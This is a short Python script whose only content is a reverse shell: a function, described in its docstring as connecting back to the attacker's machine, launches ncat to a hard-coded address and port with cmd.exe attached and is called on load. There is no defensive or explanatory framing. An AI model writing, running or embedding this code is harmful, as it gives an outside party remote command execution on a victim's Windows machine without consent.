import subprocess

def connect_back():
    """Connect back to attacker's machine and execute a shell."""
    try:
        subprocess.Popen(["ncat", "10.12.75.67", "2020", "-e", "cmd.exe"])
    except Exception as e:
        print(f"Connection failed: {e}")

connect_back()